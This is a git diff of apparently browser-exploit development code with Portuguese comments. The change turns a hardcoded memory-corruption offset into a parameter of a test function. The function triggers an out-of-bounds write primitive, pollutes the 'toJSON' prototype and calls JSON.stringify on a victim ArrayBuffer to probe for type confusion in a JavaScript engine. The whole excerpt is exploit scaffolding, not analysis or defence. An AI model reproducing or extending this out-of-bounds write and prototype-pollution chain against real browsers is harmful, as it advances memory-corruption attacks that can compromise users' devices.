@@ -13,21 +13,19 @@ export let current_toJSON_call_count_for_TypeError_test = 0;
 export async function executeFocusedTestForTypeError(
     testDescription,
     toJSONFunctionToUse, // A variante da função toJSON a ser testada
-    valueToWriteOOB // O valor a ser escrito via OOB
+    valueToWriteOOB,     // O valor a ser escrito via OOB
+    corruptionOffsetToTest // NOVO PARÂMETRO: O offset específico para esta escrita OOB
 ) {
     const FNAME = `executeFocusedTestForTypeError<${testDescription}>`;
     logS3(`--- Iniciando Teste Focado para TypeError: ${testDescription} ---`, "test", FNAME);
-    logS3(`    Valor OOB a ser escrito: ${toHex(valueToWriteOOB)}`, "info", FNAME);
+    logS3(`    Corrupção OOB: Valor=${toHex(valueToWriteOOB)} @ Offset=${toHex(corruptionOffsetToTest)}`, "info", FNAME);
     document.title = `Iniciando: ${testDescription}`;
 
     current_toJSON_call_count_for_TypeError_test = 0; // Resetar para cada teste
 
-    // Usar os parâmetros de corrupção definidos globalmente ou passá-los se necessário
-    const corruption_offset_val = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
-    const bytes_to_write_val = 4;
-    const victim_ab_size_val = 64;
+    const victim_ab_size_val = 64; // Tamanho padrão do victim_ab
+    const bytes_to_write_val = 4;  // Para 0xFFFFFFFF
     const ppKey_val = 'toJSON';
-
 
     await triggerOOB_primitive();
     if (!oob_array_buffer_real) {
@@ -61,17 +59,17 @@ export async function executeFocusedTestForTypeError(
         document.title = `PP OK (${testDescription})`;
 
         stepReached = "antes_escrita_oob";
-        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruption_offset_val)}`, "warn", FNAME);
-        document.title = `Antes OOB Write (${testDescription})`;
-        oob_write_absolute(corruption_offset_val, valueToWriteOOB, bytes_to_write_val);
+        logS3(`CORRUPÇÃO: ${toHex(valueToWriteOOB)} @ ${toHex(corruptionOffsetToTest)}`, "warn", FNAME);
+        document.title = `Antes OOB Write (${toHex(corruptionOffsetToTest)})`;
+        oob_write_absolute(corruptionOffsetToTest, valueToWriteOOB, bytes_to_write_val);
         logS3("Escrita OOB feita.", "info", FNAME);
         stepReached = "apos_escrita_oob";
-        document.title = `Após OOB Write (${testDescription})`;
+        document.title = `Após OOB Write (${toHex(corruptionOffsetToTest)})`;
 
         await PAUSE_S3(SHORT_PAUSE_S3);
 
         stepReached = "antes_stringify";
-        document.title = `Antes Stringify (${testDescription})`;
+        document.title = `Antes Stringify (${toHex(corruptionOffsetToTest)})`;
         logS3(`Chamando JSON.stringify(victim_ab) (com ${testDescription})...`, "info", FNAME);
         
         try {
